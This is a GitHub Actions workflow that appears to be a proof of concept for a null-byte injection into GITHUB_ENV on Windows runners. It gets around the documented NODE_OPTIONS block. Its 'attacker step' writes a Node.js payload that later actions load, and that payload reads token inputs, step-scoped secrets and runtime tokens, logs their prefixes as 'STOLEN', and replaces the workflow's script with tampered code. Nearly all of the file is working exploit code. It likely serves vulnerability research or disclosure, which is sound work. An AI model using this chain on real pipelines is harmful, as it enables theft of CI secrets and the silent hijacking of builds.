name: nullbyte-max-chain
on:
  push:
  workflow_dispatch:
permissions:
  contents: read
  id-token: write
jobs:
  chain:
    runs-on: windows-latest
    steps:
      - name: 'R0 control - plain NODE_OPTIONS write (documented control)'
        shell: pwsh
        run: |
          Add-Content -Path $env:GITHUB_ENV -Value "NODE_OPTIONS=--require $env:RUNNER_TEMP\nope.js"

      - name: 'R0 check - documented control held'
        shell: pwsh
        run: |
          Write-Output "CONTROL_PLAIN_NODE_OPTIONS_PRESENT=$([bool]$env:NODE_OPTIONS)"

      - name: 'R1+R2 attacker step - negative controls, payload, null-byte injection'
        shell: pwsh
        run: |
          $inputTok = [Environment]::GetEnvironmentVariable('INPUT_GITHUB-TOKEN')
          Write-Output "ATTACKER_SEES_INPUT_GITHUB_TOKEN=$([bool]$inputTok)"
          Write-Output "ATTACKER_SEES_DEPLOY_PROBE_SECRET=$([bool]$env:DEPLOY_PROBE_TOKEN)"
          Write-Output "ATTACKER_SEES_SCOPED_SECRET=$([bool]$env:SCOPED_SECRET)"
          Write-Output "ATTACKER_SEES_ACTIONS_RUNTIME_TOKEN=$([bool]$env:ACTIONS_RUNTIME_TOKEN)"
          Write-Output "ATTACKER_SEES_ID_TOKEN_REQUEST_TOKEN=$([bool]$env:ACTIONS_ID_TOKEN_REQUEST_TOKEN)"

          $pwnPath = "$env:RUNNER_TEMP\pwn2.js"
          $pwnContent = @'
(function () {
  try {
    var fs = require('fs');
    var os = require('os');
    var path = require('path');
    var where = process.env.GITHUB_ACTION_REPOSITORY || process.env.GITHUB_ACTION || 'node-child';
    var lines = [];
    lines.push('PAYLOAD_RAN_IN=' + where);
    var gt = process.env['INPUT_GITHUB-TOKEN'] || '';
    lines.push('SEES_INPUT_GITHUB_TOKEN=' + (gt ? 'true' : 'false'));
    if (gt) { lines.push('STOLEN_INPUT_GITHUB_TOKEN_PREFIX=' + gt.substring(0, 12) + '*** LEN=' + gt.length); }
    var it = process.env.INPUT_TOKEN || '';
    lines.push('SEES_INPUT_TOKEN=' + (it ? 'true' : 'false'));
    if (it) { lines.push('INPUT_TOKEN_PREFIX=' + it.substring(0, 6) + '*** LEN=' + it.length); }
    var ss = process.env.SCOPED_SECRET || '';
    lines.push('SEES_SCOPED_SECRET=' + (ss ? 'true' : 'false'));
    if (ss) { lines.push('STOLEN_SCOPED_SECRET_PREFIX=' + ss.substring(0, 12) + '*** LEN=' + ss.length); }
    var rt = process.env.ACTIONS_RUNTIME_TOKEN || '';
    lines.push('SEES_ACTIONS_RUNTIME_TOKEN=' + (rt ? 'true LEN=' + rt.length : 'false'));
    lines.push('SEES_ID_TOKEN_REQUEST_TOKEN=' + (process.env.ACTIONS_ID_TOKEN_REQUEST_TOKEN ? 'true' : 'false'));
    lines.push('NODE_OPTIONS_SEEN=' + (process.env.NODE_OPTIONS || ''));
    if (process.env.INPUT_SCRIPT) {
      lines.push('ORIGINAL_INPUT_SCRIPT_HEAD=' + JSON.stringify(String(process.env.INPUT_SCRIPT).substring(0, 80)));
      process.env.INPUT_SCRIPT = "core.info('INTEGRITY_TAMPER_DEMO=workflow_script_replaced_by_pre_entrypoint_payload'); return 'tampered-by-payload';";
      lines.push('INPUT_SCRIPT_REPLACED=true');
    }
    var sentinel = (process.env.RUNNER_TEMP ? path.join(process.env.RUNNER_TEMP, 'nullbyte-chain-sentinel.txt') : path.join(os.tmpdir(), 'nullbyte-chain-sentinel.txt'));
    fs.appendFileSync(sentinel, '--- PROCESS ' + where + ' pid=' + process.pid + ' ---\n' + lines.join('\n') + '\n');
    for (var i = 0; i < lines.length; i++) { console.log('PWN2| ' + lines[i]); }
  } catch (e) {
    try { console.log('PWN2| payload error: ' + e.message); } catch (e2) {}
  }
})();
'@
          [System.IO.File]::WriteAllText($pwnPath, $pwnContent, [System.Text.Encoding]::UTF8)

          $nullByte = [char]0
          $line = "NODE_OPTIONS" + $nullByte + "=--require " + $pwnPath.Replace('\', '/') + "`n"
          $bytes = [System.Text.Encoding]::UTF8.GetBytes($line)
          $fs = [System.IO.File]::Open($env:GITHUB_ENV, [System.IO.FileMode]::Append, [System.IO.FileAccess]::Write)
          $fs.Write($bytes, 0, $bytes.Length)
          $fs.Close()
          Write-Output "INJECTION_WRITTEN payload=$pwnPath"

      - name: 'R2-R4 victim action - actions/github-script with secret token input'
        uses: actions/github-script@v8.0.0
        with:
          github-token: ${{ secrets.DEPLOY_PROBE_TOKEN }}
          script: |
            core.info('TARGET_ACTION_BODY_RAN workflow_authored_script=true');

      - name: 'R5 victim step - step-scoped secret + node child'
        shell: pwsh
        env:
          SCOPED_SECRET: ${{ secrets.DEPLOY_PROBE_TOKEN }}
        run: |
          node -e "console.log('VICTIM_STEP_NODE_CHILD_RAN')"

      - name: 'R6 victim action 2 - actions/checkout (persistence)'
        uses: actions/checkout@v5.0.0

      - name: 'Evidence - sentinel dump'
        shell: pwsh
        run: |
          Write-Output "=== NULLBYTE CHAIN SENTINEL ==="
          if (Test-Path "$env:RUNNER_TEMP\nullbyte-chain-sentinel.txt") {
            Get-Content "$env:RUNNER_TEMP\nullbyte-chain-sentinel.txt"
          } else {
            Write-Output "SENTINEL_MISSING"
          }
          Write-Output "=== IMAGE ==="
          Write-Output "ImageOS=$env:ImageOS ImageVersion=$env:ImageVersion"
